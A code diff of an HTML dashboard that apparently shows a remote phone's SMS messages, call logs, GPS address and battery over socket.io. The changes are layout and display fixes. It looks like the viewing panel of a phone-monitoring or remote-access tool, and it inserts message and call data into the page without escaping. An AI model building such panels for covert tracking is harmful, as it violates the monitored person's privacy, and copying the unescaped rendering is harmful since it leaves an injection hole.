@@ -13,12 +13,14 @@
         .top-nav { height: 70px; background: white; display: flex; justify-content: space-between; align-items: center; padding: 0 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         .view { display: none; padding: 30px; overflow-y: auto; flex: 1; }
         .view.active { display: block; }
-        table { width: 100%; border-collapse: collapse; background: white; }
+        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; }
         th { background: var(--dark); color: white; padding: 12px; text-align: left; }
         td { padding: 12px; border-bottom: 1px solid #eee; }
         .Incoming { color: #27ae60; font-weight: bold; }
         .Outgoing { color: #2980b9; font-weight: bold; }
         .Missed { color: #e74c3c; font-weight: bold; }
+        /* Style for the separate GPS bar to prevent overlap */
+        #gps-box { font-size: 0.9rem; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 60%; }
     </style>
 </head>
 <body>
@@ -29,64 +31,109 @@
     <div class="nav-item" onclick="showView('sms')">✉️ SMS Logs</div>
     <div class="nav-item" onclick="showView('calls')">📞 Call Logs</div>
 </div>
-<div id="calls" class="view">
-    <h2>Call History</h2>
-    <table>
-        <thead><tr><th>Type</th><th>Name</th><th>Number</th><th>Duration</th><th>Date</th></tr></thead>
-        <tbody id="calls-table"></tbody>
-    </table>
-</div>
+
 <div class="main-content">
     <div class="top-nav">
-        <div id="gps-box" style="color:#7f8c8d;">📍 <span id="addr">Waiting for GPS...</span></div>
+        <div id="gps-box" style="color:#7f8c8d;">
+            📍 <span id="addr">Waiting for GPS...</span>
+        </div>
+        
         <div style="display:flex; align-items:center; gap:10px;">
-            <div id="status-box" style="padding:5px 10px; border-radius:4px; background:#fadbd8; color:#7b241c;"><span id="pct">--</span>%</div>
-            <span id="bolt" style="display:none;">⚡</span>
+            <span id="bolt" style="display:none; color: #f1c40f;">⚡</span>
+            <div id="status-box" style="padding:5px 10px; border-radius:4px; background:#fadbd8; color:#7b241c; font-weight: bold;">
+                <span id="pct">--</span>%
+            </div>
+            <span>🔋</span>
         </div>
     </div>
 
-    <div id="dash" class="view active"><h2>Device Overview</h2><p>Select a log from the sidebar.</p></div>
+    <div id="dash" class="view active">
+        <h2>Device Overview</h2>
+        <p>The system is connected. Select a log category from the sidebar to view live data.</p>
+    </div>
 
     <div id="sms" class="view">
         <h2>SMS Logs</h2>
-        <table><thead><tr><th>Type</th><th>Number</th><th>Message</th><th>Date</th></tr></thead><tbody id="sms-table"></tbody></table>
+        <table>
+            <thead><tr><th>Type</th><th>Number</th><th>Message</th><th>Date</th></tr></thead>
+            <tbody id="sms-table"></tbody>
+        </table>
     </div>
 
-    
+    <div id="calls" class="view">
+        <h2>Call History</h2>
+        <table>
+            <thead><tr><th>Type</th><th>Name</th><th>Number</th><th>Duration</th><th>Date</th></tr></thead>
+            <tbody id="calls-table"></tbody>
+        </table>
+    </div>
 </div>
 
 <script>
     const socket = io();
-   // Update showView function
+
     function showView(id) {
         document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        
         document.getElementById(id).classList.add('active');
+        // Find and highlight the clicked sidebar item
+        event.currentTarget.classList.add('active');
+
         if(id === 'sms') socket.emit('get-sms-request');
-        if(id === 'calls') socket.emit('get-calls-request'); // Request calls
+        if(id === 'calls') socket.emit('get-calls-request');
     }
 
+    // Battery Listener
     socket.on('ui-battery', (data) => {
         document.getElementById('pct').innerText = data.percent;
         document.getElementById('status-box').style.background = "#d4efdf";
+        document.getElementById('status-box').style.color = "#145a32";
         document.getElementById('bolt').style.display = data.charging ? "block" : "none";
     });
 
+    // SMS Listener
     socket.on('ui-sms-display', (data) => {
-        document.getElementById('sms-table').innerHTML = data.map(m => `<tr><td class="${m.type}">${m.type}</td><td>${m.address}</td><td>${m.body}</td><td>${new Date(m.date).toLocaleString()}</td></tr>`).join('');
-    });
-// NEW: Call Log Listener
-    socket.on('ui-calls-display', (data) => {
-        const html = data.map(c => `<tr><td class="${c.type}">${c.type}</td><td>${c.name || 'Unknown'}</td><td>${c.number}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
-        document.getElementById('calls-table').innerHTML = html;
+        document.getElementById('sms-table').innerHTML = data.map(m => `
+            <tr>
+                <td class="${m.type}">${m.type}</td>
+                <td><b>${m.address}</b></td>
+                <td>${m.body}</td>
+                <td>${new Date(m.date).toLocaleString()}</td>
+            </tr>`).join('');
     });
 
-    // NEW: GPS Address Listener
+    // Call Log Listener (Fixed Display)
+    socket.on('ui-calls-display', (data) => {
+        const body = document.getElementById('calls-table');
+        if (data && data.length > 0) {
+            body.innerHTML = data.map(c => `
+                <tr>
+                    <td class="${c.type}">${c.type}</td>
+                    <td>${c.name || '<span style="color:#bbb">Unknown</span>'}</td>
+                    <td><b>${c.number}</b></td>
+                    <td>${c.duration}</td>
+                    <td>${new Date(c.date).toLocaleString()}</td>
+                </tr>`).join('');
+        } else {
+            body.innerHTML = '<tr><td colspan="5" style="text-align:center;">No call logs found</td></tr>';
+        }
+    });
+
+    // GPS Listener (Fixed Overlap)
     socket.on('ui-gps', (data) => {
-        // Update your existing battery bar or add a new address span
-        document.getElementById('pct').innerHTML = data.address + " | " + document.getElementById('pct').innerText;
+        // Updates only the address span, leaving battery intact
+        document.getElementById('addr').innerText = data.address || `Lat: ${data.lat}, Lng: ${data.lng}`;
+    });
+
+    // Connection Status
+    socket.on('device-status', (s) => {
+        if(!s.online) {
+            document.getElementById('status-box').style.background = "#fadbd8";
+            document.getElementById('status-box').style.color = "#7b241c";
+            document.getElementById('addr').innerText = "Device Offline";
+        }
     });
 </script>
 </body>
 </html>
-
-
